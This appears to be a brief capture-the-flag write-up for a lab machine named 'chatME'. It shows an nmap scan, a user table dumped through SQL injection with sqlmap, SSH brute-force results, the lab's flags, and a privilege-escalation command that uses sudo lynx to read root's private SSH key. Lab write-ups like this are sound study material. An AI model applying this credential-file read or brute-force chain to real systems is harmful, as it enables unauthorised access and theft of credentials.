Target_ip = 192.168.150.171

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e3fc1b74e5e3c9ef6dacdfb11e4783ad (RSA)
|   256 10bd6033a0d1a47ddec8290ac47db1aa (ECDSA)
|_  256 4bfc30a81269e7b2cead99f16612cd8c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: chatME
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:AA:A2:2D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

found sql inection at the login form and used sqlmap to get credentials, found dateabase called chat, 

```sql 
**+--------+-----------------+-------------+-----------------+----------+-----------+
| userid | email           | phone       | password        | username | your_name |
+--------+-----------------+-------------+-----------------+----------+-----------+
| 5      | david@david.com | 11          | adrianthebest   | david    | david     |
| 4      | jerry@jerry.com | 111         | thatsmynonapass | jerry    | jerry     |
| 2      | nona@nona.com   | 1111        | myfriendtom     | nona     | nona      |
| 1      | pao@yahoo.com   | 09123123123 | pao             | pao      | PaoPao    |
| 3      | tina@tina.com   | 11111       | davidwhatpass   | tina     | tina      |
+--------+-----------------+-------------+-----------------+----------+-----------+
**
```
i put them in a lists ```usernames.txt and pass.txt ``` for ssh brute-forcing and it work 
```python 
[22][ssh] host: 192.168.150.171   login: nona   password: thatsmynonapass
[22][ssh] host: 192.168.150.171   login: jerry   password: myfriendtom
[22][ssh] host: 192.168.150.171   login: david   password: davidwhatpass
```

aftert loging in got our first flag under the user nona ```wordsarelies``` 

# prevesc 

found the user nona can run lynx as root, ran  this command ```sudo /usr/bin/lynx /root/.ssh/id_rsa ``` ssh into the box and got root.txt 
```talktomeroot```

